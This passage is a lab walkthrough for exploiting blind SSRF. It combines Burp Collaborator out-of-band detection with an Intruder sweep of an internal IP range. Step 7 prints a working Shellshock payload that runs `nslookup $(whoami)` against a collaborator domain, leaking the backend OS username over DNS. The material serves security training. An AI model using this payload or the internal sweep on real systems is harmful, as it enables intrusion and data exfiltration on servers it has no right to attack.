Simply using out-of-band techniques to identify blind SSRFs doesn't in itself provide a route to exploitability. Since you cannot view the response from the backend request the behavior can't be used to exploit what's inside the target system. However, it can still be used to probe for other vulnerabilities in the target system, for example:
- Blindly sweep the internal IP address space
- Send payloads designed to detect well-known vulnerabilities; wherein if the payloads employ blind out-of-band techniques, it can uncover a critical vulnerability on an unpatched server

Another way to exploit blind SSRF is to induce the application to connect to a server under the attacker's control, and return a malicious response to the HTTP client that makes the connection. If the attacker can exploit serious vulnerability in the server's HTTP implementation, it might lead to a remote code execution.
## Example
1. In [Burp Suite Professional](https://portswigger.net/burp/pro), install the "Collaborator Everywhere" extension from the BApp Store.
2. Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
3. Browse the site.
4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
5. Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
6. Send the request to the product page to Burp Intruder.
7. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
    `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
8. Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
9. Click "Clear ยง", change the Referer header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click "Add ยง".
10. Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
11. Click "Start attack".
12. When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind [SSRF attack](https://portswigger.net/web-security/ssrf). The name of the OS user should appear within the DNS subdomain.
13. To complete the lab, enter the name of the OS user.
> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.
